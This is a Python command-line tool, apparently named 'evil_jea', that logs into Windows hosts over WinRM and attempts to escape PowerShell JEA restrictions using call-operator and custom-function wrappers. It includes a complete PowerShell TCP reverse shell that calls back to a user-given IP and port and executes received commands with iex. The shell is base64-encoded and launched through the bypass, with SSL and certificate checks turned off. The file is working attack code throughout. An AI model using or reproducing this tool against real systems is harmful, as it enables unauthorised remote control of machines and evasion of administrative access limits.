#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
This is the entry point for the command-line interface (CLI) application.

.. currentmodule:: evil_jea.cli
.. moduleauthor:: Sasha Thomas (modified by amirr0r)
"""
import logging
import click
import re
import base64
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
from .__init__ import __version__

LOGGING_LEVELS = {
    0: logging.NOTSET,
    1: logging.ERROR,
    2: logging.WARN,
    3: logging.INFO,
    4: logging.DEBUG,
}

class Info(object):
    def __init__(self):
        self.verbose: int = 0

pass_info = click.make_pass_decorator(Info, ensure=True)

@click.group()
@click.option("--verbose", "-v", count=True, help="Enable verbose output.")
@pass_info
def cli(info: Info, verbose: int, max_content_width=120):
    if verbose > 0:
        logging.basicConfig(
            level=LOGGING_LEVELS[verbose] if verbose in LOGGING_LEVELS else logging.DEBUG
        )
        click.echo(
            click.style(
                f"Verbose logging is enabled. (LEVEL={logging.getLogger().getEffectiveLevel()})",
                fg="yellow",
            )
        )
    info.verbose = verbose

help_text = """
JEA Shell Commands:
    help                    Show list of available commands
    info [command]          Dump definitions for available commands. 
    call [command]          JEA bypass: Attempts to run [command] using call operator 
    function [command]      JEA bypass: Attempts to run [command] inside of a custom function
    rev_shell [ip] [port]   JEA bypass: Attempts to run a PowerShell reverse shell using call operator
"""

@cli.command()
@click.argument('username')
@click.argument('password')
@click.argument('target')
@click.option('--raw', '-r', is_flag=True, help="Pass commands through raw pipe (via add_script). Useful for executing non-cmdlet commands. Default is FALSE.")
def connect(username, password, target, raw):
    commands = ["help", "call", "function", "info", "rev_shell"]

    wsman = WSMan(target, username=username, password=password, ssl=False, auth="negotiate", cert_validation=False)
    print("[+] Testing connection...")
    test_output = run_command(wsman, "Get-Command", raw)
    if test_output:
        print("[+] Connection succeeded. Available commands:")
        for result in test_output:
            print(result)
    else:
        print("[-] Something went wrong. Check your credentials or the target.")

    while True:
        command = input(f"[{target}]: PS> ")
        root_command = command.split()[0]
        if root_command in commands:
            match root_command:
                case "help":
                    print(help_text)
                case "info":
                    info(wsman, raw)
                case "call":
                    try:
                        new = " ".join(command.split()[1:])
                        for result in call_bypass(wsman, new, raw):
                            print(result)
                    except:
                        print("Something went wrong. Did you provide an argument to the call command?")
                case "function":
                    try:
                        new = " ".join(command.split()[1:])
                        for result in function_bypass(wsman, new, raw):
                            print(result)
                    except:
                        print("Something went wrong. Did you provide an argument to the function command?")
                case "rev_shell":
                    try:
                        ip = command.split()[1]
                        port = command.split()[2]
                        reverse_shell(wsman, ip, port)
                    except:
                        print("Something went wrong. Did you pass an IP and port to connect back to?")
                case _:
                    print("JEA shell command not found!")
        else:
            result = run_command(wsman, command, raw)
            for output in result:
                print(output)

@cli.command()
def version():
    click.echo(click.style(f"{__version__}", bold=True))

@cli.command()
@click.argument('username')
@click.argument('password')
@click.argument('target')
@click.option('--command', '-c', required=True, help="Command to run on the target")
@click.option('--raw', '-r', is_flag=True, help="Pass commands through raw pipe (via add_script). Useful for executing non-cmdlet commands. Default is FALSE.")
def run(username, password, target, command, raw):
    wsman = WSMan(target, username=username, password=password, ssl=False, auth="negotiate", cert_validation=False)
    result = run_command(wsman, command, raw)
    for output in result:
        print(output)

@cli.command()
@click.argument('username')
@click.argument('password')
@click.argument('target')
@click.argument('lhost')
@click.argument('lport')
def shell(username, password, target, lhost, lport):
    wsman = WSMan(target, username=username, password=password, ssl=False, auth="negotiate", cert_validation=False)
    reverse_shell(wsman, lhost, lport)

def run_command(wsman, command, raw):
    commands = re.findall(r'(?:[^\s"]|"(?:\\.|[^"])*")+', command)
    with RunspacePool(wsman) as pool:
        ps = PowerShell(pool)
        if raw:
            ps.add_script(command)
        else:
            args = []
            params = []
            seen = False
            known_switches = [
                "UseDefaultCredentials",
                "UseBasicParsing",
                "Verbose",
                "Debug",
                "Force",
                "Recurse",
            ]

            if len(commands) > 1:
                for cmd in commands[1:]:
                    if cmd.startswith("-"):
                        param_name = cmd.lstrip("-")
                        if param_name in known_switches:
                            params.append((param_name, True))  # switch param
                            seen = False
                        else:
                            params.append(param_name)
                            seen = True
                    else:
                        if seen:
                            params.append(cmd)
                            seen = False
                        else:
                            args.append(cmd)

                ps.add_cmdlet(commands[0])
                for arg in args:
                    ps.add_argument(arg)

                # ✅ New logic: support (param, value) tuples for switches
                i = 0
                while i < len(params):
                    if isinstance(params[i], tuple):
                        ps.add_parameter(params[i][0], params[i][1])
                        i += 1
                    else:
                        try:
                            ps.add_parameter(params[i], params[i + 1])
                            i += 2
                        except IndexError:
                            print(f"[!] Missing value for parameter: {params[i]}")
                            i += 1
            else:
                ps.add_cmdlet(command)

        ps.invoke()

        output_lines = []
        if ps.had_errors:
            output_lines.append("[!] Errors:")
            for e in ps.streams.error:
                output_lines.append(str(e))

        for result in ps.output:
            output_lines.append(str(result))

        return output_lines

def call_bypass(wsman, command, raw):
    return run_command(wsman, f"&{{ {command} }}", raw)

def function_bypass(wsman, command, raw):
    return run_command(wsman, f"function gl {{ {command} }}; gl", raw)

def info(wsman, raw):
    result = run_command(wsman, 'Get-Command', raw)
    for output in result:
        print(f"Name: {output.adapted_properties.get('Name')}")
        print(f"Type: {output.adapted_properties.get('CommandType')}")
        print("==========================")
        print(output.adapted_properties.get('ScriptBlock'))

def reverse_shell(wsman, ip, port):
    shell = f"""
$client = New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + \"PS \" + (pwd).Path + \"> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
    """
    bytes = shell.encode('utf-16-le')
    b64 = base64.b64encode(bytes)
    payload = f"powershell -e {b64.decode()}"
    print("Running reverse shell payload using call bypass, check your listener:")
    print(payload)
    call_bypass(wsman, payload, True)
